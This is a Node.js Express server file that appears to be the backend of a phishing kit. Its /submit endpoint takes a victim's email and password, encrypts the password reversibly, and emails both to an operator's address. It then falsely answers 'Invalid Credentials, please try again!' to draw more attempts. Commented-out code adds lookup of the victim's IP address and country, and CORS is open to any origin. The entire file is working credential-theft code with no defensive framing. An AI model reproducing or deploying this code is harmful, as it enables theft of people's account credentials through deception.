import express from "express";
import dotenv from "dotenv";
import cors from "cors";
import CryptoJS from "crypto-js";
import nodemailer from "nodemailer";
// import axios from "axios"; // 🔥 Needed for IP lookup

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5500;

app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(express.json());

const EMAIL_USER = process.env.EMAIL_USER;
const EMAIL_PASS = process.env.EMAIL_PASS;
const NOTIFY_EMAIL = process.env.NOTIFY_EMAIL;
const SECRET_KEY = process.env.SECRET_KEY;

// 🔥 Configure Nodemailer
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS, // 🔥 Use an App Password if using Gmail
  },
});

// 🔐 Encrypt the password before sending it
function encryptPassword(password) {
  return CryptoJS.AES.encrypt(password, SECRET_KEY).toString();
}

// 🔥 Get Country from IP Address
// async function getCountryFromIP(ip) {
//   try {
//     const response = await axios.get(`https://ipapi.co/${ip}/json/`);
//     return response.data.country_name || "Unknown Country";
//   } catch (error) {
//     console.error("❌ Error fetching country:", error);
//     return "Unknown Country";
//   }
// }

// 🔥 Function to send email notification
async function sendEmailNotification(email, encryptedPassword, ip, country) {
  try {
    await transporter.sendMail({
      from: EMAIL_USER,
      to: NOTIFY_EMAIL,
      subject: "🔔 New Login Attempt Detected",
      text: `📧 New request received!
👤 Email: ${email}
🔐 Encrypted Password: ${encryptedPassword}
📅 Time: ${new Date().toLocaleString()}`,
    });
    console.log("✅ Email sent successfully!");
  } catch (error) {
    console.error("❌ Error sending email:", error);
  }
}

app.post("/submit", async (req, res) => {
  try {
    console.log("Received data:", req.body);

    const { email, password } = req.body;
    if (!email || !password) {
      return res
        .status(400)
        .json({ status: "error", message: "Missing fields" });
    }

    const encryptedPassword = encryptPassword(password);

    // 🔥 Get user's IP from the request headers (fallback to 'Unknown IP' if missing)
    // const userIP =
    //   req.headers["x-forwarded-for"] ||
    //   req.connection.remoteAddress ||
    //   "Unknown IP";

    // // 🔥 Get the country name from the IP
    // const country = await getCountryFromIP(userIP);

    // // 🔥 Log IP and country in the console
    // console.log(`🌍 Login Attempt from ${userIP} (${country})`);

    // 🔥 Send email notification
    await sendEmailNotification(email, encryptedPassword);

    res.json({
      status: "success",
      message: "Invalid Credentials, please try again!",
    });
  } catch (error) {
    console.error("Error processing request:", error);
    res.status(500).json({ status: "error", message: "Server error" });
  }
});

app.listen(PORT, () =>
  console.log(`✅ Server running on http://localhost:${PORT}`)
);
